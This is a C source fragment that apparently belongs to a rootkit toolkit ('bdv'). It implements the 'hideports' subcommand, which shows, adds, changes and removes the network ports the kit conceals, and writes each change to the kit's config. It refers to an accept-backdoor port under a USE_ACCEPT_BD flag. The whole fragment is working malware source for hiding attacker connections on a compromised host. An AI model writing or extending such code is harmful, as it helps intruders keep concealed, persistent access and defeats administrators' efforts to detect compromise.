/* loops through bc->hideports until port is located.
 * when located, the position of the port, in hideports, is returned.
 * -1 is returned if the port could not be located. */
int getportpos(const u_short *const hideports, const u_short port){
    int got = -1;
    for(int i=0; i<MAX_HIDE_PORTS && got<0; i++)
        got = hideports[i] == port ? i : -1;
    return got;
}
#define findnewpos(H) getportpos(H,0)
/* move all non-zero values (port numbers) to the beginning of BC->hideports. for use after removing a port. */
#define shiftports(H) do{ \
    size_t count = 0, i; \
    for(i=0; i<MAX_HIDE_PORTS; i++) H[i] != 0 ? H[count++] = H[i] : 0; \
    while(count<MAX_HIDE_PORTS) H[count++]=0; \
} while(0)

/* displays valid things that ./bdv hideports can do. */
void options_hideports(const char *a0, const char *a1, const char *hpopt, const int optmode){
    if(hpopt == NULL) optusgndie(a0, a1, validhpopts, 16);
    switch(optmode){
        case HPOPTS_RM:
        case HPOPTS_ADD:
            bxprintf(ADD_NEW_ITEM_STRING, a0, a1, hpopt);
            break;
        case HPOPTS_CHANGE:
            bxprintf(CHANGE_ITEM_STRING, a0, a1, hpopt);
            break;
        default:
            options_hideports(a0, a1, NULL, -1);
    }
    exit(0);
}

/* from argv, determine what operation in ./bdv hideports the user wants to do & do it. */
void dohideports(char *const argv[]){
    if(!reinitmvbc()){
        xperror(REINITMVBC);
        exit(0);
    }

    const char *hpopt;
    int mode;
    if(!(hpopt = argv[2]) || (mode = getoptmode(hpopt, validhpopts)) < 0)
        options_hideports(argv[0], argv[1], NULL, -1);

    switch(mode){
        u_short oport, nport;
        int got;
        case HPOPTS_SHOW:
            printhideports(mvbc);
            break;
        case HPOPTS_CHANGE:
            /* change port, in argv[3], to the port specified in argv[4]. */
            !argv[3] || !argv[4] ? options_hideports(argv[0], argv[1], hpopt, mode) : 0;
            oport = (u_short)atoi(argv[3]), nport = (u_short)atoi(argv[4]);
            !oport || !nport ? options_hideports(argv[0], argv[1], hpopt, mode) : 0;
            if(getportpos(mvbc->hideports, nport) != -1){
                /* verify port not already in hideports. */
                bxprintf(NEW_PORT_ALREADY_HIDDEN, nport);
                break;
            }else if((got = getportpos(mvbc->hideports, oport)) > -1){
                /* replace oport with nport. */
                mvbc->hideports[got] = nport;
                updbdvcfg(mvbc);
                bxprintf(PORT_SUCCESSFULLY_CHANGED, oport, nport);
            }else bxprintf(PORT_CHANGE_FAILED, oport, nport);
            break;
        case HPOPTS_ADD:
            /* add port, specified in argv[3], to the kit's hideports. */
            if(mvbc->portcount >= MAX_HIDE_PORTS){
                bxprintf(MAX_PORTS_REACHED, 0);
                break;
            }
            /* verify input & port is not already in hideports. */
            !argv[3] || !(nport = (u_short)atoi(argv[3])) ? options_hideports(argv[0], argv[1], hpopt, mode) : 0;
            if(getportpos(mvbc->hideports, nport) != -1){
                bxprintf(PORT_ALREADY_ADDED, nport);
                break;
            }else if((got = findnewpos(mvbc->hideports)) > -1){
                /* put new port in empty space & update current portcount. */
                mvbc->hideports[got] = nport;
                ++mvbc->portcount;
                updbdvcfg(mvbc);
                bxprintf(PORT_ADDED_SUCCESSFULLY, nport);
            }else bxprintf(BIG_FAIL_STRING, 0);
            break;
        case HPOPTS_RM:
            if(mvbc->portcount <= 2){
                bxprintf(PORT_COUNT_TOO_LOW, 0);
                break;
            }
            /* remove port, specified in argv[3], from mvbc->hideports. */
            !argv[3] || !(oport = (u_short)atoi(argv[3])) ? options_hideports(argv[0], argv[1], hpopt, mode) : 0;
#ifdef USE_ACCEPT_BD
            if(oport == mvbc->hideports[0])
                bxprintf(ACCEPT_PORT_NOTIFICATION, 0);
#endif
            if((got = getportpos(mvbc->hideports, oport)) > -1){
                /* clear target port. update current portcount. */
                mvbc->hideports[got] = 0;
                --mvbc->portcount;
                shiftports(mvbc->hideports);
                updbdvcfg(mvbc);
                bxprintf(SPECIFIED_PORT_REMOVED, 0);
            }else bxprintf(SPECIFIED_PORT_INVALID, 0);
            break;
    }
}